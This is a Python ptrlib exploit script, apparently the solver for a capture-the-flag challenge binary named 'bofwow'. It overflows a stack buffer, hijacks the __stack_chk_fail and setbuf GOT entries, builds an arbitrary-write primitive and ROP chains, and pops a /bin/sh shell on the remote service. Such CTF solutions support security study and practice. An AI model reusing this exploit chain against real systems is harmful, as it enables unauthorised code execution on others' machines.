from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9003))

libc = ELF("../distfiles/libc.so.6")
elf = ELF("../distfiles/bofwow")
#sock = Process("../distfiles/bofwow")
sock = Socket(HOST, PORT)

# Get infinite loop
payload  = p64(elf.symbol("main"))
payload += b"\x00"*0x128
payload += p64(elf.got("__stack_chk_fail"))
payload += p64(0x1000)
payload += p64(0x1000)
sock.sendlineafter("? ", payload)
sock.sendlineafter("? ", 0xdead)

# AAW
def aaw(addr, value):
    payload  = p64(value)
    payload += b"\x00"*0x128
    payload += p64(addr)
    payload += p64(0x1000)
    payload += p64(0x1000)
    sock.sendlineafter("? ", payload)
    sock.sendlineafter("? ", 0xdead)

# Prepare gadget
# 0x004012bc: add [rbp-0x3d], ebx; nop; ret;
# 0x004014c3: mov ebx, [rbp-8]; leave; ret;
addr_cmd = 0x4040a0
aaw(addr_cmd, u64(b"/bin/sh\0"))

addr_chain = 0x404f00
aaw(addr_chain + 8, next(elf.gadget("add [rbp-0x3d], ebx; nop; ret;")))
aaw(addr_chain + 0x10, elf.symbol('main'))

offset = (libc.symbol("system") + 4) - libc.symbol("setbuf")
aaw(addr_chain - 8, offset)
aaw(addr_chain + 0, elf.got('setbuf') + 0x3d)

# Calculate system address
payload  = p64(next(elf.gadget("ret")))
payload += b"\x00"*0x108
payload += p64(addr_chain) # rbp
payload += p64(next(elf.gadget("mov ebx, [rbp-8]; leave; ret")))
payload += b"A"*0x10
payload += p64(elf.got('__stack_chk_fail'))
payload += p64(0x1000)
payload += p64(0x1000)
sock.sendlineafter("? ", payload)
sock.sendlineafter("? ", 0xdead)

# Get infinite loop
payload  = p64(elf.symbol("main"))
payload += b"\x00"*0x128
payload += p64(elf.got("__stack_chk_fail"))
payload += p64(0x1000)
payload += p64(0x1000)
sock.sendlineafter("? ", payload)
sock.sendlineafter("? ", 0xdead)

# Prepare gadget
# 0x00401289: mov edi, 0x4040a0; jmp rax;
# 0x004015a3: mov rax, [rbp-0x18]; leave; ret;
addr_chain = 0x404f38 # avoid null byte
aaw(addr_chain + 8, next(elf.gadget("mov edi, 0x4040a0; jmp rax")))
aaw(elf.got('setbuf') + 0x18, addr_chain)
aaw(elf.got('setbuf') + 0x20, next(elf.gadget("leave; ret")))

# Win
payload  = p64(next(elf.gadget("ret")))
payload += b"\x00"*0x108
payload += p64(elf.got('setbuf') + 0x18) # rbp
payload += p64(next(elf.gadget("mov rax, [rbp-0x18]; leave; ret")))
payload += b"A"*0x10
payload += p64(elf.got('__stack_chk_fail'))
payload += p64(0x1000)
payload += p64(0x1000)
sock.sendlineafter("? ", payload)
sock.sendlineafter("? ", 0xdead)

sock.sh()
